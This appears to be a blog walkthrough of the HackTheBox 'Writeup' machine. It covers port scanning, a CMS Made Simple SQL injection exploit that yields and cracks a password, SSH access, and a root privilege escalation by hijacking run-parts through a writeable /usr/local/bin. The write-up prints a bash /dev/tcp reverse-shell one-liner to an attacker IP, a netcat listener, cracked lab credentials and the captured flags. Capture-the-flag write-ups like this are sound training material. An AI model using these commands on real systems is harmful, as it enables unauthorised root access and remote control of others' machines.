---
layout: post
title: "Writeup (HTB) Walkthrough"
date: 2019-09-29
---

Writeup is a vulnerable machine from [HackTheBox]. 
Write up is rated as an easy box, which is supposed to be close to real-life scenario.
In this machine one gets to practice enumeration, exploits and $PATH hijacking.

**Vulnerable System**: Writeup (HacktheBox)
===========================================

**Operating System**: Debian

**Kernel**: 4.9.0-8-amd64 x86_64

**Vulnerability Exploited**: CMS Made Simple SQL Injection

**Exploit Used**: CMS Made Simple \< 2.2.10 - SQL Injection

**Proof of Concept Code**: https://www.exploit-db.com/exploits/46635

**Vulnerability Explained**: Due to SQL Injection vulnerability present in CMS
Made Simple, a malicious user can obtain username and password for the
application. Coincidently, the same credentials worked for SSH.

**Vulnerability fix**: Upgrade the software to the newest version.

**Severity**: **Medium**

**Privilege Escalation Vulnerability**: Cronjob/Writeable Directory in \$PATH
variable

**Exploit Used**: Custom

**Proof of Concept Code**: bash -i \>& /dev/tcp/10.10.15.99/443 0\>&1

**Privilege Escalation Vulnerability Explained:** A background job with root
privileges triggered every time a new user would sign into the system. The job
ran executable run-parts with the path variable. Due to one of the directories
in the path prior to where the executable was residing was writeable, another
executable was created with reverse shell code inside. The next time a user
signed in the reverse shell with root privileges was obtained.

**Vulnerability fix**: Implement Strong Access Control on directories assigned
in \$PATH variable

**Severity**: **High**

Methodology
-----------

-   Port Scanning (nmap)

-   Port 80 Enumeration (browser)

-   Discovered SQL Injection Vulnerability in CMS (searchsploit/exploit-db)

-   Obtained Credentials From CMS for User jkr

-   Low Privilege Shell Gained (ssh)

-   Privilege Escalation Enumeration (pspy64)

-   Discovered Exploitable Vector

-   Created Conditions for Reverse Shell with Root Privileges

Reconnaissance
--------------

### Nmap

Nmap all ports scan:
```
root\@lifesfun:\~/HTB/Writeup\# nmap -p- 10.10.10.138

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-29 17:47 EDT

Nmap scan report for 10.10.10.138

Host is up (0.12s latency).

Not shown: 65533 filtered ports

PORT STATE SERVICE

22/tcp open ssh

80/tcp open http
```


Aggressive, version and default script scan:

```
root\@lifesfun:\~/HTB/Writeup\# nmap -A -sV -sC -p 22,80 10.10.10.138

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-29 17:53 EDT

Nmap scan report for 10.10.10.138

Host is up (0.13s latency).

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)

\| ssh-hostkey:

\| 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)

\| 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)

\|\_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)

80/tcp open http Apache httpd 2.4.25 ((Debian))

\| http-robots.txt: 1 disallowed entry

\|_/writeup/

\|_http-title: Nothing here yet.

Warning: OSScan results may be unreliable because we could not find at least 1
open and 1 closed port

Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13
(92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%),
Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)

HOP RTT ADDRESS

1 127.98 ms 10.10.12.1

2 128.06 ms 10.10.10.138

OS and Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 21.16 seconds

```

### Port 80 Enumeration

#### Browser

Writeup directory:

![](media/74f8f6fc0a451a5a165f626bcb6c14dc.png)

Discovering software running on the backend in writeup directory source code:

![](media/19c5660cc43678a099ef9cc114bac88a.png)

Low Privilege Exploitation
--------------------------

### Searching for suitable exploit.

```
root\@lifesfun:\~\# searchsploit cms made simple

\-----------------------------------------------------------------------------------------------
----------------------------------------

Exploit Title \| Path

\| (/usr/share/exploitdb/)

\-----------------------------------------------------------------------------------------------
----------------------------------------

CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution
(Metasploit) \| exploits/php/remote/46627.rb

CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion \|
exploits/php/webapps/26217.html

CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting \|
exploits/php/webapps/26298.txt

CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting \|
exploits/php/webapps/29272.txt

CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection \|
exploits/php/webapps/29941.txt

CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities \|
exploits/php/webapps/32668.txt

CMS Made Simple 1.11.9 - Multiple Vulnerabilities \|
exploits/php/webapps/43889.txt

CMS Made Simple 1.2 - Remote Code Execution \| exploits/php/webapps/4442.txt

CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection \|
exploits/php/webapps/4810.txt

CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload \|
exploits/php/webapps/5600.php

CMS Made Simple 1.4.1 - Local File Inclusion \| exploits/php/webapps/7285.txt

CMS Made Simple 1.6.2 - Local File Disclosure \| exploits/php/webapps/9407.txt

CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting \|
exploits/php/webapps/33643.txt

CMS Made Simple 1.6.6 - Multiple Vulnerabilities \|
exploits/php/webapps/11424.txt

CMS Made Simple 1.7 - Cross-Site Request Forgery \|
exploits/php/webapps/12009.html

CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion \|
exploits/php/webapps/34299.py

CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery \|
exploits/php/webapps/34068.html

CMS Made Simple 2.1.6 - Multiple Vulnerabilities \|
exploits/php/webapps/41997.txt

CMS Made Simple 2.1.6 - Remote Code Execution \| exploits/php/webapps/44192.txt

CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution \|
exploits/php/webapps/44976.py

CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution \|
exploits/php/webapps/45793.py

CMS Made Simple \< 1.12.1 / \< 2.1.3 - Web Server Cache Poisoning \|
exploits/php/webapps/39760.txt

CMS Made Simple \< 2.2.10 - SQL Injection \| exploits/php/webapps/46635.py

CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload \|
exploits/php/webapps/34300.py

CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload \|
exploits/php/webapps/34298.py

CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload
\| exploits/php/webapps/46546.py

\-----------------------------------------------------------------------------------------------
----------------------------------------

Shellcodes: No Result

Papers: No Result
```

### Low Privilege Exploit

Using CMS Made Simple \< 2.2.10 - SQL Injection exploit to obtain username and
password for the low privilege user.

```
root\@lifesfun:\~/HTB/Writeup\# python 46635.py -u http://10.10.10.138/writeup/
--crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 5a599ef579066807

[+] Username found: jkr

[+] Email found: jkr\@writeup.htb

[+] Password found: 62def4866937f08cc13bab43bb14e6f7

[+] Password cracked: raykayjay9
```

### Low Privilege Shell

```
root\@lifesfun:\~\# ssh jkr\@10.10.10.138

jkr\@10.10.10.138's password:

Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Sun Sep 29 19:58:26 2019 from 10.10.13.54
```

### User Flag

```
jkr\@writeup:\~\$ ls

user.txt

jkr\@writeup:\~\$ cat user.txt

d4e493fd4068afc9eb1aa6a55319f978
```


Privilege Escalation
--------------------

### Enumeration

Downloading pspy64 executable to the victim machine. pspy is a really useful CLI
tool which helps to see comamands run by users and cronjobs.
https://github.com/DominicBreuker/pspy

```
jkr\@writeup:\~\$ wget 10.10.15.99/pspy64

\--2019-09-29 17:51:22-- http://10.10.15.99/pspy64

Connecting to 10.10.15.99:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 3078592 (2.9M)

Saving to: ‘pspy64’

pspy64 100%[===================\>] 2.94M 708KB/s in 5.5s

2019-09-29 17:51:35 (546 KB/s) - ‘pspy64’ saved [3078592/3078592]
```

Running pspy to discover that there is a cronjob running run-parts executable
with a PATH variable specified:

```
jkr\@writeup:\~\$ ./pspy64

\<---------snippet--------------\>

2019/10/01 22:58:14 FS: ACCESS \| /var/log/auth.log

2019/10/01 22:58:14 FS: CLOSE_NOWRITE \| /var/log/auth.log

2019/10/01 22:58:14 FS: OPEN \| /etc/passwd

2019/10/01 22:58:14 FS: CLOSE_NOWRITE \| /etc/passwd

2019/10/01 22:58:14 FS: OPEN \| /etc/passwd

2019/10/01 22:58:14 FS: CLOSE_NOWRITE \| /etc/passwd

2019/10/01 22:58:14 FS: OPEN \| /etc/login.defs

2019/10/01 22:58:14 FS: ACCESS \| /etc/login.defs

2019/10/01 22:58:14 FS: CLOSE_NOWRITE \| /etc/login.defs

2019/10/01 22:58:14 CMD: UID=0 PID=3695 \| sh -c /usr/bin/env -i
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts
--lsbsysinit /etc/update-motd.d \> /run/motd.dynamic.new

2019/10/01 22:58:14 FS: MODIFY \| /var/log/auth.log

2019/10/01 22:58:14 FS: OPEN \| /var/log/auth.log

2019/10/01 22:58:14 FS: ACCESS \| /var/log/auth.log

2019/10/01 22:58:14 FS: CLOSE_NOWRITE \| /var/log/auth.log

\<---------snippet--------------\>
```

Next step is to find writeable directories available, and it turns out that
/usr/local/bin is included in the PATH variable.

```
jkr\@writeup:\~\$ find / -type d -writable 2\> /dev/null

/proc/2209/task/2209/fd

/proc/2209/fd

/proc/2209/map_files

/var/local

/var/lib/php/sessions

/var/tmp

/usr/local

/usr/local/bin

/usr/local/include

/usr/local/share

/usr/local/share/sgml

/usr/local/share/sgml/misc

/usr/local/share/sgml/stylesheet

/usr/local/share/sgml/entities

/usr/local/share/sgml/dtd

/usr/local/share/sgml/declaration

/usr/local/share/fonts

/usr/local/share/man

/usr/local/share/emacs

/usr/local/share/emacs/site-lisp

/usr/local/share/xml

/usr/local/share/xml/schema

/usr/local/share/xml/misc

/usr/local/share/xml/entities

/usr/local/share/xml/declaration

/usr/local/games

/usr/local/src

/usr/local/etc

/usr/local/lib

/usr/local/lib/python3.5

/usr/local/lib/python3.5/dist-packages

/usr/local/lib/python2.7

/usr/local/lib/python2.7/dist-packages

/usr/local/lib/python2.7/site-packages

/usr/local/sbin

/run/user/1000

/run/shm

/run/lock

/home/jkr

```

. /usr/local/bin is the 2nd value in the PATH variable, which means the
executable placed in it will execute before the rest of the PATH:
/usr/sbin:/usr/bin:/sbin:/bin

### Root Shell

Newly created run-parts file with reverse shell code is placed in the path
folder prior to it's the original one.

```
jkr\@writeup:\~\$ nano /usr/local/bin/run-parts

bash -i \>& /dev/tcp/10.10.15.99/443 0\>&1

```

On attacker VM, turning on netcat to listen for incoming connection.

```
root\@lifesfun:\~\# nc -nvlp 443

listening on [any] 443 ...
```

Triggering the executable with another ssh connection.

```
root\@lifesfun:\~\# ssh jkr\@10.10.10.138

jkr\@10.10.10.138's password:
```

Catching the reverse shell.

```
root\@lifesfun:\~\# nc -nvlp 443

listening on [any] 443 ...

connect to [10.10.15.99] from (UNKNOWN) [10.10.10.138] 48358

bash: cannot set terminal process group (2683): Inappropriate ioctl for device

bash: no job control in this shell
```

### Root Flag

```
root\@writeup:/\# cd /root

cd /root

root\@writeup:/root\# ls

ls

bin

root.txt

root\@writeup:/root\# cat root.txt

cat root.txt

eeba47f60b48ef92b734f9b6198d7226

root\@writeup:/root\#
```
